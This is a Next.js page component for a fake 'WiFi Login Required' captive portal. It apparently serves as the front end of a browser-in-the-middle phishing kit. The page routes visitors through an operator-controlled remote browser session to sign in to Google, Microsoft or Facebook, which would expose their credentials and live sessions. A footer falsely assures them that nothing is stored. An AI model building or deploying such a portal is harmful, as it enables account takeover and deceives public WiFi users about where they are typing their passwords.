"use client";

import { useRouter } from "next/navigation";
import { useState } from "react";

export default function WiFiLoginPage() {
  const router = useRouter();
  const [loading, setLoading] = useState(false);

  const handleLogin = async (provider: 'google' | 'microsoft' | 'facebook') => {
    setLoading(true);
    
    try {
      // Define allowlist hosts for each provider
      let allowlistHosts = "";
      let loginUrl = "";
      
      switch (provider) {
        case 'google':
          allowlistHosts = "accounts.google.com,www.google.com,google.com,mail.google.com,drive.google.com";
          loginUrl = "https://accounts.google.com/signin";
          break;
        case 'microsoft':
          allowlistHosts = "login.microsoftonline.com,outlook.com,outlook.live.com,login.live.com,www.microsoft.com";
          loginUrl = "https://login.microsoftonline.com";
          break;
        case 'facebook':
          allowlistHosts = "www.facebook.com,facebook.com,m.facebook.com";
          loginUrl = "https://www.facebook.com/login";
          break;
      }

      // Create a browser session with appropriate allowlist
      const res = await fetch("/api/remote-browser/session", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          allowlist_hosts: allowlistHosts,
          start_url: loginUrl
        }),
        credentials: "include",
      });

      if (!res.ok) {
        throw new Error("Failed to create session");
      }

      const data = await res.json();

      // Wait for container to be ready before redirecting (browser needs time to start)
      await new Promise(resolve => setTimeout(resolve, 8000));

      // Redirect to the browser session
      window.location.href = data.iframeUrl;
    } catch (error) {
      console.error("Login error:", error);
      setLoading(false);
      alert("Failed to start session. Please try again.");
    }
  };

  return (
    <div style={{
      minHeight: "100vh",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      background: "linear-gradient(135deg, #667eea 0%, #764ba2 100%)",
      fontFamily: "system-ui, -apple-system, sans-serif"
    }}>
      <div style={{
        maxWidth: 450,
        width: "100%",
        padding: "40px 30px",
        backgroundColor: "white",
        borderRadius: 16,
        boxShadow: "0 20px 60px rgba(0,0,0,0.3)",
        margin: 20
      }}>
        {/* WiFi Icon */}
        <div style={{
          textAlign: "center",
          marginBottom: 30
        }}>
          <div style={{
            fontSize: 72,
            marginBottom: 10
          }}>📶</div>
          <h1 style={{
            margin: 0,
            fontSize: 28,
            fontWeight: 700,
            color: "#333"
          }}>WiFi Login Required</h1>
        </div>

        <p style={{
          textAlign: "center",
          color: "#666",
          fontSize: 16,
          lineHeight: 1.6,
          marginBottom: 35
        }}>
          To access the internet, please authenticate with one of the following services:
        </p>

        {/* Login Buttons */}
        <div style={{
          display: "flex",
          flexDirection: "column",
          gap: 15
        }}>
          {/* Google Login */}
          <button
            onClick={() => handleLogin('google')}
            disabled={loading}
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: 12,
              padding: "16px 24px",
              backgroundColor: "#fff",
              border: "2px solid #ddd",
              borderRadius: 12,
              fontSize: 16,
              fontWeight: 600,
              cursor: loading ? "not-allowed" : "pointer",
              transition: "all 0.2s",
              opacity: loading ? 0.6 : 1
            }}
            onMouseEnter={(e) => {
              if (!loading) {
                e.currentTarget.style.borderColor = "#4285f4";
                e.currentTarget.style.transform = "translateY(-2px)";
                e.currentTarget.style.boxShadow = "0 4px 12px rgba(66, 133, 244, 0.3)";
              }
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.borderColor = "#ddd";
              e.currentTarget.style.transform = "translateY(0)";
              e.currentTarget.style.boxShadow = "none";
            }}
          >
            <svg width="24" height="24" viewBox="0 0 24 24">
              <path fill="#4285f4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
              <path fill="#34a853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
              <path fill="#fbbc05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
              <path fill="#ea4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
            </svg>
            <span style={{ color: "#333" }}>Continue with Google</span>
          </button>

          {/* Microsoft/Outlook Login */}
          <button
            onClick={() => handleLogin('microsoft')}
            disabled={loading}
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: 12,
              padding: "16px 24px",
              backgroundColor: "#fff",
              border: "2px solid #ddd",
              borderRadius: 12,
              fontSize: 16,
              fontWeight: 600,
              cursor: loading ? "not-allowed" : "pointer",
              transition: "all 0.2s",
              opacity: loading ? 0.6 : 1
            }}
            onMouseEnter={(e) => {
              if (!loading) {
                e.currentTarget.style.borderColor = "#00a4ef";
                e.currentTarget.style.transform = "translateY(-2px)";
                e.currentTarget.style.boxShadow = "0 4px 12px rgba(0, 164, 239, 0.3)";
              }
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.borderColor = "#ddd";
              e.currentTarget.style.transform = "translateY(0)";
              e.currentTarget.style.boxShadow = "none";
            }}
          >
            <svg width="24" height="24" viewBox="0 0 24 24">
              <path fill="#f25022" d="M0 0h11.377v11.372H0z"/>
              <path fill="#00a4ef" d="M12.623 0H24v11.372H12.623z"/>
              <path fill="#7fba00" d="M0 12.628h11.377V24H0z"/>
              <path fill="#ffb900" d="M12.623 12.628H24V24H12.623z"/>
            </svg>
            <span style={{ color: "#333" }}>Continue with Microsoft</span>
          </button>

          {/* Facebook Login */}
          <button
            onClick={() => handleLogin('facebook')}
            disabled={loading}
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: 12,
              padding: "16px 24px",
              backgroundColor: "#fff",
              border: "2px solid #ddd",
              borderRadius: 12,
              fontSize: 16,
              fontWeight: 600,
              cursor: loading ? "not-allowed" : "pointer",
              transition: "all 0.2s",
              opacity: loading ? 0.6 : 1
            }}
            onMouseEnter={(e) => {
              if (!loading) {
                e.currentTarget.style.borderColor = "#1877f2";
                e.currentTarget.style.transform = "translateY(-2px)";
                e.currentTarget.style.boxShadow = "0 4px 12px rgba(24, 119, 242, 0.3)";
              }
            }}
            onMouseLeave={(e) => {
              e.currentTarget.style.borderColor = "#ddd";
              e.currentTarget.style.transform = "translateY(0)";
              e.currentTarget.style.boxShadow = "none";
            }}
          >
            <svg width="24" height="24" viewBox="0 0 24 24">
              <path fill="#1877f2" d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
            </svg>
            <span style={{ color: "#333" }}>Continue with Facebook</span>
          </button>
        </div>

        {loading && (
          <div style={{
            marginTop: 25,
            textAlign: "center",
            color: "#666",
            fontSize: 14
          }}>
            <div style={{
              display: "inline-block",
              width: 20,
              height: 20,
              border: "3px solid #f3f3f3",
              borderTop: "3px solid #667eea",
              borderRadius: "50%",
              animation: "spin 1s linear infinite"
            }}></div>
            <p style={{ marginTop: 10 }}>Starting secure session...</p>
          </div>
        )}

        <div style={{
          marginTop: 30,
          paddingTop: 25,
          borderTop: "1px solid #eee",
          textAlign: "center"
        }}>
          <p style={{
            fontSize: 13,
            color: "#999",
            margin: 0,
            lineHeight: 1.5
          }}>
            🔒 Your login credentials are secure and encrypted.<br/>
            We do not store your password.
          </p>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{
        __html: `
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `
      }} />
    </div>
  );
}
